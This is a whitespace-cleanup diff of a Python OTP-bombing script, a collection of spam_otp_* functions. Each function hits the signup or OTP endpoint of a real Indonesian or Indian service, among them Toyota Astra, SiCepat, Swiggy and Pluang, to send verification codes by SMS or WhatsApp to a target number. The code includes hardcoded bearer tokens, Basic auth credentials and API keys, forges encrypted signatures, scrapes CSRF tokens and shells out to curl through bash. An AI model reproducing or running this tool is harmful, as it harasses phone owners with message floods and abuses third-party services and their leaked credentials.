@@ -1252,13 +1254,13 @@ def spam_otp_alodokter(nomor):
             },
             "request_via": "whatsapp"
         }
-        
+
         resp = session.post(url, json=payload, headers=headers, timeout=10)
         return resp.status_code < 400
      except:
         return False
-       
-       
+
+
 def spam_otp_optikmelawai(nomor):
      try:
         if nomor.startswith("0"):
@@ -1269,10 +1271,10 @@ def spam_otp_optikmelawai(nomor):
             nomor_lokal = nomor
         else:
             nomor_lokal = "62" + nomor
-        
+
         session = requests.Session()
         url = "https://api.optikmelawai.com/api/v3/auth/register/1"
-        
+
         headers = {
             'authorization': 'Bearer a6a84b1f1e604d683fbef2295c2262373eba254197a1e14ab3a1e95a4394e4debf13560e5dbd66ab1e628aa3e73d3667d11f083077e562169b78d2ef2f3d285542a22f5ae174badd1313593deb5ec4389c75de38055b4964969a8323f031d47a6b35b3af4a096a08d6dddc2bf616c36bbeea1602b5b8a041650909107c207ed9',
             'x-unique-user': 'GA1.1.1062236172.1780823549',
@@ -1281,7 +1283,7 @@ def spam_otp_optikmelawai(nomor):
             'Referer': 'https://www.optikmelawai.com/',
             'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
         }
-        
+
         data = {
             "phone_number": nomor_lokal,
             "name": "User",
@@ -1289,12 +1291,12 @@ def spam_otp_optikmelawai(nomor):
             "password": "Test123",
             "password_confirmation": "Test123"
         }
-        
+
         resp = session.post(url, data=data, headers=headers, timeout=10)
         return resp.status_code < 400
      except:
         return False
-       
+
 
 def spam_otp_jembatani(nomor):
      try:
@@ -1304,28 +1306,28 @@ def spam_otp_jembatani(nomor):
             nomor_lokal = "0" + nomor[2:]
         else:
             nomor_lokal = "0" + nomor
-        
+
         import random
         import string
         rand_name = 'User' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
         rand_pass = "Test@" + ''.join(random.choices(string.ascii_letters + string.digits, k=5)) + "#1"
-        
+
         session = requests.Session()
         url = "https://api.jembatani.co.id/v1/register"
-        
+
         headers = {
             'Content-Type': 'application/json',
             'Origin': 'https://jembatani.co.id',
             'Referer': 'https://jembatani.co.id/',
             'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
         }
-        
+
         payload = {
             "phone": nomor_lokal,
             "name": rand_name,
             "password": rand_pass
         }
-        
+
         resp = session.post(url, json=payload, headers=headers, timeout=10)
         return resp.status_code < 400
      except:
@@ -1339,28 +1341,28 @@ def spam_otp_rcx(nomor):
             nomor_lokal = nomor[2:]
         else:
             nomor_lokal = nomor
-        
+
         import random
         import string
         rand_name = 'User' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
         rand_email = f'user{random.randint(1000,9999)}@mailnesia.com'
-        
+
         session = requests.Session()
         url = "https://sso.rcx.co.id/auth/passwordless/request"
-        
+
         headers = {
             'Content-Type': 'application/json',
             'Origin': 'https://sso.rcx.co.id',
             'Referer': 'https://sso.rcx.co.id/',
             'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
         }
-        
+
         payload = {
             "phone": nomor_lokal,
             "name": rand_name,
             "email": rand_email
         }
-        
+
         resp = session.post(url, json=payload, headers=headers, timeout=10)
         return resp.status_code < 400
      except:
@@ -1374,24 +1376,24 @@ def spam_otp_sahabatteknisi(nomor):
             nomor_lokal = nomor[2:]
         else:
             nomor_lokal = nomor
-        
+
         session = requests.Session()
         url = "https://www.sahabatteknisi.co.id/api/auth/otp/check-phone"
-        
+
         headers = {
             'Content-Type': 'application/json',
             'Origin': 'https://www.sahabatteknisi.co.id',
             'Referer': 'https://www.sahabatteknisi.co.id/',
             'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
         }
-        
+
         payload = {"phone": nomor_lokal}
-        
+
         resp = session.post(url, json=payload, headers=headers, timeout=10)
         return resp.status_code < 400
      except:
         return False
-       
+
 def spam_otp_liva(nomor):
      try:
 
@@ -1710,7 +1712,7 @@ def spam_otp_tiptip(nomor):
             nomor_lokal = nomor
         else:
             nomor_lokal = "+62" + nomor
-        
+
         curl_cmd = f"""curl -s -X POST 'https://api.tiptip.id/authentication/guest/v1/phone/otp/send' \\
   -H 'host: api.tiptip.id' \\
   -H 'channel-device: Chrome' \\
@@ -1738,9 +1740,9 @@ def spam_otp_tiptip(nomor):
   -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
   -H 'priority: u=1, i' \\
   -d '{{"action":"SIGN_UP","delivery_method":"WA","phone_number":"{nomor_lokal}"}}'"""
-        
+
         result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
-        
+
         if result.returncode == 0 and result.stdout:
             try:
                 data = json.loads(result.stdout)
@@ -1750,7 +1752,7 @@ def spam_otp_tiptip(nomor):
             except:
                 return True
         return False
-        
+
     except Exception as e:
         return False
 
@@ -1881,7 +1883,7 @@ def spam_otp_seva(nomor):
         from Crypto.Cipher import AES
         from Crypto.Util.Padding import pad
         from Crypto.Random import get_random_bytes
-        
+
         if nomor.startswith('0'):
             nomor = '+62' + nomor[1:]
         elif nomor.startswith('62'):
@@ -1900,21 +1902,21 @@ def spam_otp_seva(nomor):
                     d_i = hashlib.md5(d_i + password + salt).digest()
                     d += d_i
                 return (d[:32], d[32:48])
-            
+
             key_derived, iv = derive_key_iv(key_bytes, salt)
             cipher = AES.new(key_derived, AES.MODE_CBC, iv)
             encrypted = cipher.encrypt(pad(data.encode(), AES.block_size))
             return base64.b64encode(b'Salted__' + salt + encrypted).decode()
-        
+
         SECRET = 'c2ea90e6b78d9e29f3b9824e5b6bf2e84931f876f1660bf3b4c87c5a938d86d5'
         TS = str(int(time.time() * 1000))
         payload = {'phoneNumber': nomor}
         body = cryptojs_encrypt(json.dumps(payload), SECRET)
         sig_data = TS + ';' + json.dumps(payload)
         signature = cryptojs_encrypt(json.dumps(sig_data), SECRET)
-        
+
         session = requests.Session()
-        
+
         headers = {
             'accept': 'application/json',
             'content-type': 'text/plain',
@@ -1923,12 +1925,12 @@ def spam_otp_seva(nomor):
             'referer': 'https://www.seva.id/',
             'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
         }
-        
+
         resp = session.post('https://api.seva.id/auth/otp/whatsapp', 
                            data=body, 
                            headers=headers, 
                            timeout=10)
-        
+
         if resp.status_code == 200:
             try:
                 data = resp.json()
@@ -1939,7 +1941,7 @@ def spam_otp_seva(nomor):
                 return True if resp.status_code == 200 else False
         else:
             return False
-                
+
     except Exception as e:
         return False
 
@@ -1948,16 +1950,16 @@ def spam_otp_uatas(nomor):
         import json
         import time
         import base64
-        
+
         from Crypto.Cipher import AES
-        
+
         from Crypto.Util.Padding import pad
-        
+
         if nomor.startswith('+62'):
             nomor = '0' + nomor[3:]
         elif nomor.startswith('62'):
             nomor = '0' + nomor[2:]
-        
+
         nomor = ''.join(filter(str.isdigit, nomor))
         if not nomor.startswith('0'):
             nomor = '0' + nomor
@@ -1974,7 +1976,7 @@ def spam_otp_uatas(nomor):
         data = aes_encrypt(json.dumps(params), KEY, IV)
         session = requests.Session()
         resp = session.post('https://uatas.id/delapi/web/passport/sendphonecode', headers={'accept': 'application/json', 'content-type': 'application/json', 'origin': 'https://uatas.id', 'referer': 'https://uatas.id/h5/gml/', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'}, json={'uid': '0', 'ticket': '0', 'sec_level': '2', 'package_name': 'uatas', 'm_id': '10', 'data': data, 'version': '1.0.0'}, timeout=10)
-        
+
         return resp.status_code == 200
     except:
         return False
@@ -1989,14 +1991,14 @@ def spam_otp_topindowa(nomor):
             phone = '0' + nomor[3:]
         else:
             phone = '0' + nomor
-        
+
         import uuid
         import time
-        
+
         uuid_device = str(uuid.uuid4())
-        
+
         url = 'https://mobileapps.topindoku.co.id/api/v3/topindoku/helper/auth/register-via-web/otp/request'
-        
+
         headers = {
             'Host': 'mobileapps.topindoku.co.id',
             'sec-ch-ua-platform': '"Android"',
@@ -2010,7 +2012,7 @@ def spam_otp_topindowa(nomor):
             'Accept-Encoding': 'gzip, deflate, br, zstd',
             'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
         }
-        
+
         payload = {
             "phone": phone,
             "via": "WA",
@@ -2019,10 +2021,10 @@ def spam_otp_topindowa(nomor):
             "fbp": "fb.2.1784860943418.959857478235602163",
             "event_source_url": "https://mitra.topindoku.co.id/pendaftaran-mitra/?source=organic&referral=MTPD"
         }
-        
+
         resp = requests.post(url, json=payload, headers=headers, timeout=10)
         return resp.status_code < 400
-        
+
     except Exception as e:
         return False
 
@@ -2034,12 +2036,12 @@ def spam_otp_kasirpintar(nomor):
             nomor = nomor[1:]
         elif not nomor.startswith('62'):
             nomor = '62' + nomor
-        
+
         if nomor.startswith('0'):
             nomor = '+62' + nomor[1:]
         elif nomor.startswith('62'):
             nomor = '+' + nomor
-        
+
         session = requests.Session()
         r1 = session.get('https://kasirpintar.co.id/registerpro', 
             headers={
@@ -2142,19 +2144,19 @@ def spam_otp_toyota(nomor):
             phone = '0' + nomor[3:]
         else:
             phone = '0' + nomor
-        
+
         phone = ''.join(filter(str.isdigit, phone))
-        
+
         if not phone.startswith('0'):
             phone = '0' + phone
-        
+
         import subprocess
         import json
-        
+
         curl_cmd = f"""TOKEN=$(curl -s -X POST 'https://data-web.tam-icm.com/api/public/vendors/tokenize' -H 'Authorization: Basic ZGlkeDpUb3lvdGEyMDI0' -H 'Content-Type: application/json' -H 'Accept: application/json' -H 'Origin: https://www.toyota.astra.co.id' -H 'Referer: https://www.toyota.astra.co.id/' -H 'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36' -d '{{\"data\":[\"{phone}\"]}}' | jq -r '.[0].token') && curl -s -X POST 'https://data-web.tam-icm.com/api/public/vendors/register' -H 'Host: data-web.tam-icm.com' -H 'sec-ch-ua-platform: "Android"' -H 'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36' -H 'Accept: application/json, text/plain, */*' -H 'sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"' -H 'Content-Type: application/json' -H 'sec-ch-ua-mobile: ?1' -H 'Origin: https://www.toyota.astra.co.id' -H 'sec-fetch-site: cross-site' -H 'sec-fetch-mode: cors' -H 'sec-fetch-dest: empty' -H 'Referer: https://www.toyota.astra.co.id/' -H 'Accept-Encoding: gzip, deflate, br, zstd' -H 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' -d '{{\"phoneNumber\":\"$TOKEN\"}}'"""
-        
+
         result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
-        
+
         if result.returncode == 0 and result.stdout:
             try:
                 data = json.loads(result.stdout)
@@ -2166,7 +2168,7 @@ def spam_otp_toyota(nomor):
             except:
                 return True
         return False
-        
+
     except Exception as e:
         return False
 
@@ -2182,23 +2184,23 @@ def spam_otp_ktakilat(nomor):
             nomor_lokal = nomor
 
         url = 'https://api.pendanaan.com/kta/api/v1/user/commonSendWaSmsCode'
-        
+
         payload = {
             'mobileNo': nomor_lokal,
             'smsType': 1
         }
-        
+
         headers = {
             'Content-Type': 'application/json; charset=UTF-8',
             'Device-Info': 'eyJhZENoYW5uZWwiOiJvcmdhbmljIiwiYWRJZCI6IjE1NDk3YTliLTI2NjktNDJjZi1hZDEwLWQwZDBkOGY1MGFkMCIsImFuZHJvaWRJZCI6ImI3ODcwNDViMTQwYzYzMWYiLCJhcHBOYW1lIjoiS3RhS2lsYXQiLCJhcHBWZXJzaW9uIjoiNS4yLjYiLCJjb3VudHJ5Q29kZSI6IklEIiwiY291bnRyeU5hbWUiOiJJbmRvbmVzaWEiLCJjcHVDb3JlcyI6NCwiZGVsaXZlcnlQbGF0Zm9ybSI6Imdvb2dsZSBwbGF5IiwiZGV2aWNlTm8iOiJiNzg3MDQ1YjE0MGM2MzFmIiwiaW1laSI6IiIsImltc2kiOiIiLCJtYWMiOiIwMDpkYjozNDozYjplNTo2NyIsIm1lbW9yeVRvdGFsIjo0MTM3OTcxNzEyLCJwYWNrYWdlTmFtZSI6ImNvbS5rdGFraWxhdC5sb2FuIiwicGhvbmVCcmFuZCI6InNhbXN1bmciLCJwaG9uZUJyYW5kTW9kZWwiOiJTTS1HOTY1TiIsInNkQ2FyZFRvdGFsIjozNTEzOTU5MjE5Miwic3lzdGVtUGxhdGZvcm0iOiJhbmRyb2lkIiwic3lzdGVtVmVyc2lvbiI6IjkiLCJ1dWlkIjoiYjc4NzA0NWIxNDBjNjMxZl9iNzg3MDQ1YjE0MGM2MzFmIn0='
         }
-        
+
         res = requests.post(url, json=payload, headers=headers, timeout=10)
         return res.status_code == 200
-        
+
     except Exception as e:
         return False
-        
+
 def spam_otp_bantusaku(nomor):
     try:
         if nomor.startswith('62'):
@@ -2212,7 +2214,7 @@ def spam_otp_bantusaku(nomor):
 
         unique_code = str(uuid.uuid4())
         url = 'https://m.bantusaku.id/api/user/send-sms'
-        
+
         headers = {
             'accept': 'application/json, text/plain, */*',
             'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
@@ -2232,7 +2234,7 @@ def spam_otp_bantusaku(nomor):
             'x-token-sign': unique_code,
             'x-version': 'web-3.2.1'
         }
-        
+
         payload = {
             'phone': nomor_lokal,
             'type': 'register',
@@ -2240,10 +2242,10 @@ def spam_otp_bantusaku(nomor):
             'merchantNo': 'BantuSaku',
             'uniquCode': unique_code
         }
-        
+
         resp = requests.post(url, json=payload, headers=headers, timeout=10)
         return resp.status_code < 400
-        
+
     except Exception as e:
         return False
 
@@ -2260,15 +2262,15 @@ def spam_otp_bisatopup(nomor):
 
         dev = spam_otp_codex(16)
         url = f'https://api-mobile.bisatopup.co.id/register/send-verification?type=WA&device_id={dev}&version_name=6.12.04&version=61204'
-        
+
         payload = f'phone_number={nomor_lokal}'
         headers = {
             'Content-Type': 'application/x-www-form-urlencoded'
         }
-        
+
         res = requests.post(url, data=payload, headers=headers, timeout=10)
         return res.status_code == 200
-        
+
     except Exception as e:
         return False
 
@@ -2288,10 +2290,10 @@ def spam_otp_speedcash_wa(nomor):
             'Authorization': 'Basic NGFiYmZkNWQtZGNkYS00OTZlLWJiNjEtYWMzNzc1MTdjMGJmOjNjNjZmNTZiLWQwYWItNDlmMC04NTc1LTY1Njg1NjAyZTI5Yg==',
             'Content-Type': 'application/x-www-form-urlencoded'
         }
-        
+
         res_tok = requests.post(url_token, data='grant_type=client_credentials', headers=headers_token, timeout=10)
         token = spam_otp_nilai(res_tok.text, 'access_token":"', '","')
-        
+
         if token:
             uuid = spam_otp_codex(8)
             url_otp = 'https://sofia.bmsecure.id/central-api/sc-api/otp/generate'
@@ -2315,7 +2317,7 @@ def spam_otp_speedcash_wa(nomor):
             return res.status_code == 200
         else:
             return False
-            
+
     except Exception as e:
         return False
 
@@ -2332,7 +2334,7 @@ def spam_otp_sicepat(nomor):
 
         apikey = '67b98547-6cf7-4f05-9c1b-be597fca892f'
         url = f'https://api.sicepatconsumer.com/v3/masterdata/user/otp/request/{nomor_lokal}?sms=true'
-        
+
         headers = {
             'Host': 'api.sicepatconsumer.com',
             'User-Agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
@@ -2342,10 +2344,10 @@ def spam_otp_sicepat(nomor):
             'Referer': 'https://dashboard.sicepat.com/',
             'sec-ch-ua-platform': 'Android'
         }
-        
+
         resp = requests.get(url, headers=headers, timeout=10)
         return resp.status_code < 400
-        
+
     except Exception as e:
         return False
 
@@ -2362,7 +2364,7 @@ def spam_otp_iskconmumbai(nomor):
 
         session = requests.Session()
         url = 'https://www.iskconmumbai.com/api/send_otp'
-        
+
         headers = {
             'Host': 'www.iskconmumbai.com',
             'Content-Type': 'application/json',
@@ -2370,7 +2372,7 @@ def spam_otp_iskconmumbai(nomor):
             'Referer': 'https://www.iskconmumbai.com/web/signup',
             'Cookie': 'frontend_lang=en_US; session_id=a06efb92ff6b53383e6136b42413bc5cc1af2fc0'
         }
-        
+
         payload = {
             'id': 7,
             'jsonrpc': '2.0',
@@ -2380,10 +2382,10 @@ def spam_otp_iskconmumbai(nomor):
                 'mobile': nomor_lokal
             }
         }
-        
+
         resp = session.post(url, json=payload, headers=headers, timeout=10)
         return resp.status_code < 400
-        
+
     except Exception as e:
         return False
 
@@ -2419,7 +2421,7 @@ def spam_otp_yogyaonline(nomor):
             headers={'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'},
             timeout=10
         )
-        
+
         url = 'https://www.yogyaonline.co.id/api/v1/send-otp'
         headers = {
             'accept': 'application/json, text/plain, */*',
@@ -2437,11 +2439,11 @@ def spam_otp_yogyaonline(nomor):
             'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
             'x-requested-with': 'XMLHttpRequest'
         }
-        
+
         payload = {'phone_number': nomor_lokal}
         resp = session.post(url, json=payload, headers=headers, timeout=10)
         return resp.status_code < 400
-        
+
     except Exception as e:
         return False
 
@@ -2458,7 +2460,7 @@ def spam_otp_bantusaku(nomor):
 
         unique_code = str(uuid.uuid4())
         url = 'https://m.bantusaku.id/api/user/send-sms'
-        
+
         headers = {
             'accept': 'application/json, text/plain, */*',
             'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
@@ -2478,7 +2480,7 @@ def spam_otp_bantusaku(nomor):
             'x-token-sign': unique_code,
             'x-version': 'web-3.2.1'
         }
-        
+
         payload = {
             'phone': nomor_lokal,
             'type': 'register',
@@ -2486,10 +2488,10 @@ def spam_otp_bantusaku(nomor):
             'merchantNo': 'BantuSaku',
             'uniquCode': unique_code
         }
-        
+
         resp = requests.post(url, json=payload, headers=headers, timeout=10)
         return resp.status_code < 400
-        
+
     except Exception as e:
         return False
 
@@ -2511,7 +2513,7 @@ def spam_otp_mengantar(nomor):
 
         session = requests.Session()
         url = 'https://app.mengantar.com/api/auth/send-verification-code'
-        
+
         headers = {
             'accept': 'application/json, text/plain, */*',
             'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
@@ -2526,7 +2528,7 @@ def spam_otp_mengantar(nomor):
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-origin'
         }
-        
+
         payload = {
             'courier': 'JNE',
             'email': email,
@@ -2536,10 +2538,10 @@ def spam_otp_mengantar(nomor):
             'subject': 'register',
             'verificationType': 'whatsapp'
         }
-        
+
         resp = session.post(url, json=payload, headers=headers, timeout=10)
         return resp.status_code < 400
-        
+
     except Exception as e:
         return False
 
@@ -2574,7 +2576,7 @@ def spam_otp_pluang(nomor):
 
         session = requests.Session()
         url = 'https://api-pluang.pluang.com/api/v3/user/signup/phone'
-        
+
         headers = {
             'accept': 'application/json, text/plain, */*',
             'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
@@ -2593,7 +2595,7 @@ def spam_otp_pluang(nomor):
             'x-platform': 'desktop-web',
             'x-request-id': request_id
         }
-        
+
         payload = {
             'name': nama,
             'email': email,
@@ -2602,10 +2604,10 @@ def spam_otp_pluang(nomor):
             'referral': '',
             'signature': '107216cfe6d1023ceeb94a5c63f498f6a126160345d4ad9b375daef34371ebfe'
         }
-        
+
         resp = session.post(url, json=payload, headers=headers, timeout=10)
         return resp.status_code < 400
-        
+
     except Exception as e:
         return False
 
@@ -2622,7 +2624,7 @@ def spam_otp_youtap(nomor):
 
         session = requests.Session()
         url = 'https://bos-api.youtap.id/v1/graphql'
-        
+
         headers = {
             'accept': 'application/json, text/plain, */*',
             'content-type': 'application/json',
@@ -2634,7 +2636,7 @@ def spam_otp_youtap(nomor):
             'x-timezone': 'Asia/Jakarta',
             'x-village-id': '7ceec169-6e16-11ec-a41a-9383440169c7'
         }
-        
+
         # Step 1: Check phone
         payload1 = {
             'variables': {
@@ -2645,10 +2647,10 @@ def spam_otp_youtap(nomor):
             },
             'query': 'mutation ($checkPhoneInput: CheckPhoneInput!) {\n checkPhone(checkPhoneInput: $checkPhoneInput) {\n merchantRegistration {\n id\n phone\n platformType\n otpExpiredAt\n }\n token\n }\n}'
         }
-        
+
         resp1 = session.post(url, json=payload1, headers=headers, timeout=10)
         token = resp1.json().get('data', {}).get('checkPhone', {}).get('token')
-        
+
         if token:
             # Step 2: Regenerate OTP
             headers['authorization'] = f'Bearer {token}'
@@ -2660,7 +2662,7 @@ def spam_otp_youtap(nomor):
             return resp2.status_code < 400
         else:
             return False
-            
+
     except Exception as e:
         return False
 
@@ -2699,7 +2701,7 @@ def spam_otp_byu(nomor):
             nomor_lokal = '0' + nomor
 
         url = 'https://pidaw-app.cx.byu.id/api/v3/user-service/v6/id/en-US/WEB/signin/otp'
-        
+
         headers = {
             'accept': 'application/json',
             'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
@@ -2720,15 +2722,15 @@ def spam_otp_byu(nomor):
             'x-deviceid': '17776076111271930882471',
             'x-request-id': 'a33150a0-87cd-48ea-89ad-7314024949aa'
         }
-        
+
         payload = {
             'identifier': nomor_lokal,
             'channel': 'web'
         }
-        
+
         resp = requests.post(url, json=payload, headers=headers, timeout=10)
         return resp.status_code < 400
-        
+
     except Exception as e:
         return False
 
@@ -2748,7 +2750,7 @@ def spam_otp_astradaihatsu2(nomor):
             headers={'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'},
             timeout=10
         )
-        
+
         import re
         csrf = re.search('name="CSRFToken" value="([^"]+)"', r1.text)
         if csrf:
@@ -2768,7 +2770,7 @@ def spam_otp_astradaihatsu2(nomor):
             return r2.status_code < 400
         else:
             return False
-            
+
     except Exception as e:
         return False
 
@@ -2788,7 +2790,7 @@ def spam_otp_astradaihatsu_sms(nomor):
             headers={'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'},
             timeout=10
         )
-        
+
         import re
         csrf = re.search('name="CSRFToken" value="([^"]+)"', r1.text)
         if csrf:
@@ -2808,7 +2810,7 @@ def spam_otp_astradaihatsu_sms(nomor):
             return r2.status_code < 400
         else:
             return False
-            
+
     except Exception as e:
         return False
 
@@ -2820,9 +2822,9 @@ def spam_otp_vedantu(nomor):
             nomor = nomor[2:]
         elif nomor.startswith('+62'):
             nomor = nomor[3:]
-        
+
         session = requests.Session()
-        
+
         url_login = 'https://user.vedantu.com/user/login/auth'
         headers_login = {
             'accept': 'application/json, text/plain, */*',
@@ -2840,12 +2842,12 @@ def spam_otp_vedantu(nomor):
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36'
         }
         payload_login = {"ver": 12.269}
-        
+
         resp_login = session.post(url_login, json=payload_login, headers=headers_login, timeout=10)
-        
+
         if resp_login.status_code != 200:
             return False
-        
+
         url_otp = 'https://user.vedantu.com/user/resendPreLoginVerificationOTP'
         headers_otp = {
             'accept': 'application/json, text/plain, */*',
@@ -2870,9 +2872,9 @@ def spam_otp_vedantu(nomor):
             "sType": "VEDANTU_F_7_N",
             "sValue": "FC34EE3DD29934CD6723BA8151D3E"
         }
-        
+
         resp_otp = session.post(url_otp, json=payload_otp, headers=headers_otp, timeout=10)
-        
+
         if resp_otp.status_code == 200:
             try:
                 data = resp_otp.json()
@@ -2883,7 +2885,7 @@ def spam_otp_vedantu(nomor):
             except:
                 return True
         return False
-        
+
     except Exception as e:
         return False
 
@@ -2900,7 +2902,7 @@ def spam_otp_viuum(nomor):
 
         session = requests.Session()
         url = 'https://api.viuum.co.id/api_viuum/v1/customer/one-time-phone'
-        
+
         headers = {
             'accept': '*/*',
             'content-type': 'application/json',
@@ -2908,11 +2910,11 @@ def spam_otp_viuum(nomor):
             'referer': 'https://wearviuum.com/',
             'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
         }
-        
+
         payload = {'number': nomor_lokal}
         resp = session.post(url, json=payload, headers=headers, timeout=10)
         return resp.status_code < 400
-        
+
     except Exception as e:
         return False
 
@@ -2926,15 +2928,15 @@ def spam_otp_onebunda(nomor):
             phone = '0' + nomor[3:]
         else:
             phone = '0' + nomor
-        
+
         phone = ''.join(filter(str.isdigit, phone))
-        
+
         if not phone.startswith('0'):
             phone = '0' + phone
-        
+
         import subprocess
         import json
-        
+
         curl_cmd = f"""curl -s -X POST 'https://cms.bunda.co.id/api/v1/auth/send-otp' \\
   -H 'host: cms.bunda.co.id' \\
   -H 'sec-ch-ua-platform: "Android"' \\
@@ -2954,9 +2956,9 @@ def spam_otp_onebunda(nomor):
   -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
   -H 'priority: u=1, i' \\
   -d '{{"phone_number":{phone},"type":"auth"}}'"""
-        
+
         result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
-        
+
         if result.returncode == 0 and result.stdout:
             try:
                 data = json.loads(result.stdout)
@@ -2968,7 +2970,7 @@ def spam_otp_onebunda(nomor):
             except:
                 return True
         return False
-        
+
     except Exception as e:
         return False
 
@@ -3004,21 +3006,21 @@ def spam_otp_swiggy(nomor):
             nomor = nomor[2:]
         elif nomor.startswith('0'):
             nomor = nomor[1:]
-        
+
         import random
         import string
-        
+
         nama = ''.join(random.choices(string.ascii_letters, k=random.randint(6, 10))).capitalize()
-        
+
         session = requests.Session()
-        
+
         headers_get = {
             'User-Agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
             'Accept-Encoding': 'gzip, deflate, br'
         }
-        
+
         session.get('https://www.swiggy.com/auth', headers=headers_get, timeout=10)
-        
+
         headers_post = {
             'accept': '*/*',
             '__fetch_req__': 'true',
@@ -3036,7 +3038,7 @@ def spam_otp_swiggy(nomor):
             'user-id': '0',
             'Accept-Encoding': 'gzip, deflate, br'
         }
-        
+
         payload = {
             'name': nama,
             'email': '',
@@ -3046,12 +3048,12 @@ def spam_otp_swiggy(nomor):
             'countryCode': '62',
             'countryKey': 'IN'
         }
-        
+
         resp = session.post('https://www.swiggy.com/mapi/auth/signup', 
                            json=payload, 
                            headers=headers_post, 
                            timeout=10)
-        
+
         if resp.status_code == 200:
             try:
                 data = resp.json()
@@ -3063,7 +3065,7 @@ def spam_otp_swiggy(nomor):
                 return True if resp.status_code == 200 else False
         else:
             return False
-                
+
     except Exception as e:
         return False
 
@@ -3080,7 +3082,7 @@ def spam_otp_cilory(nomor):
 
         session = requests.Session()
         url = 'https://www.cilory.com/app/w/auth/soft'
-        
+
         headers = {
             'accept': 'application/json',
             'accept-encoding': 'gzip, deflate, br',
@@ -3095,15 +3097,15 @@ def spam_otp_cilory(nomor):
             'sec-fetch-site': 'same-origin',
             'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
         }
-        
+
         payload = {
             'mobile': nomor_lokal,
             'country_code': '+62'
         }
-        
+
         resp = session.post(url, json=payload, headers=headers, timeout=10)
         return resp.status_code < 400
-        
+
     except Exception as e:
         return False
 
@@ -3123,21 +3125,21 @@ def spam_otp_naturalfarm(nomor):
             headers={'User-Agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'},
             timeout=10
         )
-        
+
         import re
         key_match = re.search('dZp91nhRNg6u[^"]*', js_resp.text)
         if not key_match:
             return False
-            
+
         api_key = key_match.group(0)
-        
+
         wilayah = [
             {'province': 1, 'city': 161, 'subdistrict': 2236, 'label': 'Bali, Jembrana, Pekutatan'},
             {'province': 32, 'city': 322, 'subdistrict': 4569, 'label': 'Sumatera Barat, Padang Pariaman, 2 X 11 Kayu Tanam'}
         ]
         w = random.choice(wilayah)
         address_id = f"{w['province']}_{w['city']}_{w['subdistrict']}"
-        
+
         first_names = ['Andi', 'Budi', 'Citra', 'Dewi', 'Eko', 'Fajar', 'Gina', 'Hana', 'Irwan', 'Joko']
         last_names = ['Santoso', 'Wijaya', 'Susanto', 'Rahayu', 'Kusuma', 'Pratama', 'Sari', 'Putra']
         first_name = random.choice(first_names)
@@ -3151,7 +3153,7 @@ def spam_otp_naturalfarm(nomor):
         gender = random.choice([1, 2])
         streets = ['JL.Merdeka', 'JL.Sudirman', 'JL.Gatot Subroto', 'JL.Ahmad Yani', 'JL.Diponegoro']
         street = f'{random.choice(streets)} No. {random.randint(1, 100)}'
-        
+
         url = 'https://api.naturalfarm.id/api/appv1-1/register/phone'
         headers = {
             'Accept': 'application/json',
